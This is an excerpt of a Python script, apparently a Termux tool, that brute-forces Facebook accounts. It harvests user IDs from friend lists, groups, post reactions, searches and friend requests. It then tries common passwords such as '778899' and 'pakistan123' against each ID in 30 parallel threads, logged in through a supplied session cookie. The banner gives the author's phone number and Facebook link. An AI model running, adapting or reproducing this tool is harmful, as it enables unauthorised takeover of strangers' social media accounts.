...
#Author    : James404
#Whatapps : +96598064347
#My Facebook (https://www.facebook.com/Apni.bapka.account7)
...
{W}\____/_/     /_/  \___/_/|_|
{B}──────────────────────────────────────────────────
{Y}>> {W}Author         {R}: {C}James404
{Y}>> {W}Whatapps      {R}: {C}+96598064347
{Y}>> {W}Group Facebook {R}: {C}Termux Comand World
{B}──────────────────────────────────────────────────''')
    print()
...
def masuk():
    ...
    if "mbasic_logout_button" in str(ismi):
        ...
        print('\033[00mCookies \033[91mWrong\033[00m')
        time.sleep(1)
...
def nid():
    ...
    print("\033[96mName \033[93m: \033[92m"+name)
...
def menu():
    ...
    nid()
    print('''
\033[92m{\033[96m1\033[92m} \033[00mCrack From Friendlist
\033[92m{\033[96m2\033[92m} \033[00mCrack From Public Friendlist
\033[92m{\033[96m3\033[92m} \033[00mCrack From React Post
\033[92m{\033[96m4\033[92m} \033[00mCrack From Group
\033[92m{\033[96m5\033[92m} \033[00mCrackFrom Search
\033[92m{\033[96m6\033[92m} \033[00mCrack From Friend Requests
\033[92m{\033[91m0\033[92m} \033[91mBack
\033[94m──────────────────────────────────────────────────''')
    pilih_menu()
def pilih_menu():
    ...
    if ff == '1':
       ...
       with ThreadPoolExecutor(max_workers=30) as ex:
            for user in username:
                ...
                for x in bb:
                    ...
                    litpas.append('778899')
                    litpas.append('pakistan123')
                    for passw in set(litpas):
                        ex.submit(login,(aa[1]),(passw))
       print('\n\033[93m{\033[96m•\033[93m} \033[92mDone...')
    elif ff == '2':
       clear()
       baner()
       nid()
       asw=input('\033[1;96mId Fb public \033[91m: \033[93m')
       if asw.isdigit():
       ...
       try:
           ...
           print('\033[91mUser Id doesnt exist\033[00m')
           sleep(1)
           menu()
       with ThreadPoolExecutor(max_workers=30) as ex:
            for user in username:
       ...
       print('\n\033[93m{\033[96m•\033[93m} \033[92mDone...')
         ...
         baner()
         nid()
         asw=input('\033[1;96mlink posting \033[91m: \033[93m')
         if 'www.facebook' in asw:
             ...
             print('\033[91mCan not be empty!\033[00m')
             sleep(1)
             menu()
         username=like(asw)
         with ThreadPoolExecutor(max_workers=30) as ex:
         ...
         sys.exit('\033[1;97mThank you for using my script\n\033[91mexit\033[00m')
    else:
         print('\033[91mLook at the menu please\033[00m')
         sleep(1)
         menu()
